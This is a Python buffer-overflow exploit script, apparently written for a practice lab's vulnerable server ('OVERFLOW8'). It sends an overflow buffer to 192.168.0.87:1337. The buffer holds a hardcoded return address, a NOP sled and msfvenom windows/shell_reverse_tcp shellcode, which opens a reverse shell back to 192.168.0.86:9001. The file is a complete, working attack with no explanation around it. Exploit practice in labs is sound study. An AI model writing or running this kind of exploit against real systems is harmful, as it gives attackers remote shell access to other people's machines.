#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 5

# Badchars: \x00\x1d\x2e\xc7\xee
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -f c -b "\x00\x1d\x2e\xc7\xee"
payload = (
"\xb8\x5b\x12\x6d\xf1\xdb\xd5\xd9\x74\x24\xf4\x5b\x33\xc9"
"\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\x18\x1c\x8f\x04\x62"
"\xc8\xcd\xe7\x9a\x09\xb2\x6e\x7f\x38\xf2\x15\xf4\x6b\xc2"
"\x5e\x58\x80\xa9\x33\x48\x13\xdf\x9b\x7f\x94\x6a\xfa\x4e"
"\x25\xc6\x3e\xd1\xa5\x15\x13\x31\x97\xd5\x66\x30\xd0\x08"
"\x8a\x60\x89\x47\x39\x94\xbe\x12\x82\x1f\x8c\xb3\x82\xfc"
"\x45\xb5\xa3\x53\xdd\xec\x63\x52\x32\x85\x2d\x4c\x57\xa0"
"\xe4\xe7\xa3\x5e\xf7\x21\xfa\x9f\x54\x0c\x32\x52\xa4\x49"
"\xf5\x8d\xd3\xa3\x05\x33\xe4\x70\x77\xef\x61\x62\xdf\x64"
"\xd1\x4e\xe1\xa9\x84\x05\xed\x06\xc2\x41\xf2\x99\x07\xfa"
"\x0e\x11\xa6\x2c\x87\x61\x8d\xe8\xc3\x32\xac\xa9\xa9\x95"
"\xd1\xa9\x11\x49\x74\xa2\xbc\x9e\x05\xe9\xa8\x53\x24\x11"
"\x29\xfc\x3f\x62\x1b\xa3\xeb\xec\x17\x2c\x32\xeb\x58\x07"
"\x82\x63\xa7\xa8\xf3\xaa\x6c\xfc\xa3\xc4\x45\x7d\x28\x14"
"\x69\xa8\xff\x44\xc5\x03\x40\x34\xa5\xf3\x28\x5e\x2a\x2b"
"\x48\x61\xe0\x44\xe3\x98\x63\xab\x5c\xa2\x25\x43\x9f\xa2"
"\xea\xba\x16\x44\x86\xac\x7e\xdf\x3f\x54\xdb\xab\xde\x99"
"\xf1\xd6\xe1\x12\xf6\x27\xaf\xd2\x73\x3b\x58\x13\xce\x61"
"\xcf\x2c\xe4\x0d\x93\xbf\x63\xcd\xda\xa3\x3b\x9a\x8b\x12"
"\x32\x4e\x26\x0c\xec\x6c\xbb\xc8\xd7\x34\x60\x29\xd9\xb5"
"\xe5\x15\xfd\xa5\x33\x95\xb9\x91\xeb\xc0\x17\x4f\x4a\xbb"
"\xd9\x39\x04\x10\xb0\xad\xd1\x5a\x03\xab\xdd\xb6\xf5\x53"
"\x6f\x6f\x40\x6c\x40\xe7\x44\x15\xbc\x97\xab\xcc\x04\xb7"
"\x49\xc4\x70\x50\xd4\x8d\x38\x3d\xe7\x78\x7e\x38\x64\x88"
"\xff\xbf\x74\xf9\xfa\x84\x32\x12\x77\x94\xd6\x14\x24\x95"
"\xf2"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")